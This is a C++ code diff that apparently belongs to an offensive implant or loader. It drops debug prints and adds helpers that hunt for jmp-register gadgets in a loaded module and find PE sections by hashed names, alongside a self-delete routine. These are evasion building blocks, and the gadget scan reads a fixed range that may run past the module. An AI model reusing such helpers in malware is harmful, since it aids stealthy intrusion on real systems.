@@ -32,9 +32,7 @@ auto DECLFN Useful::FixTls(
 ) -> VOID {
     if ( DataDir->Size ) {
         PIMAGE_TLS_DIRECTORY TlsDir   = (PIMAGE_TLS_DIRECTORY)( U_PTR( Base ) + DataDir->VirtualAddress );
-        KhDbg("%p", TlsDir);
         PIMAGE_TLS_CALLBACK* Callback = (PIMAGE_TLS_CALLBACK*)TlsDir->AddressOfCallBacks;
-        KhDbg("%p", Callback);
 
         if ( Callback ) {
             for ( INT i = 0; Callback[i] != nullptr; ++i ) {
@@ -42,6 +40,27 @@ auto DECLFN Useful::FixTls(
             }
         }
     }
+}
+
+auto DECLFN Useful::FindGadget(
+    _In_ UPTR   ModuleBase,
+    _In_ UINT16 RegValue
+) -> UPTR {
+    UPTR   Gadget      = 0;
+    BYTE*  SearchBase  = NULL;
+    SIZE_T SearchSize  = 0;
+    UINT16 JmpValue    = 0xff;
+
+    SearchBase = B_PTR( ModuleBase + 0x1000 );
+    SearchSize = 0x1000 * 0x1000;    
+
+    for ( INT i = 0; i < SearchSize - 1; i++ ) {
+        if ( SearchBase[i] == JmpValue && SearchBase[i+1] == RegValue ) {
+            Gadget = U_PTR( SearchBase + i ); break;
+        }
+    }
+
+    return Gadget;
 }
 
 auto DECLFN Useful::FixExp(
@@ -112,6 +131,50 @@ auto DECLFN Useful::FixImp(
 	
 	return TRUE;
 }
+
+auto DECLFN Useful::SecVa(
+    _In_ UPTR LibBase,
+    _In_ UPTR SecHash
+) -> ULONG {
+    PIMAGE_NT_HEADERS     Header = { 0 };
+    PIMAGE_SECTION_HEADER SecHdr = { 0 };
+
+    Header = (PIMAGE_NT_HEADERS)( LibBase + ( (PIMAGE_DOS_HEADER)( LibBase ) )->e_lfanew );
+
+    if ( Header->Signature != IMAGE_NT_SIGNATURE ) return 0;
+
+    SecHdr = IMAGE_FIRST_SECTION( Header );
+
+    for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
+        if ( Hsh::Str( SecHdr[i].Name ) == SecHash ) {
+            return SecHdr[i].VirtualAddress;
+        }
+    }
+
+    return 0;
+}
+
+auto DECLFN Useful::SecSize(
+    _In_ UPTR LibBase,
+    _In_ UPTR SecHash
+) -> ULONG {
+    PIMAGE_NT_HEADERS     Header = { 0 };
+    PIMAGE_SECTION_HEADER SecHdr = { 0 };
+
+    Header = (PIMAGE_NT_HEADERS)( LibBase + ( (PIMAGE_DOS_HEADER)( LibBase ) )->e_lfanew );
+
+    if ( Header->Signature != IMAGE_NT_SIGNATURE ) return 0;
+
+    SecHdr = IMAGE_FIRST_SECTION( Header );
+
+    for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
+        if ( Hsh::Str( SecHdr[i].Name ) == SecHash ) {
+            return SecHdr[i].SizeOfRawData;
+        }
+    }
+
+    return 0;
+} 
 
 auto DECLFN Useful::SelfDelete( VOID ) -> BOOL {
 
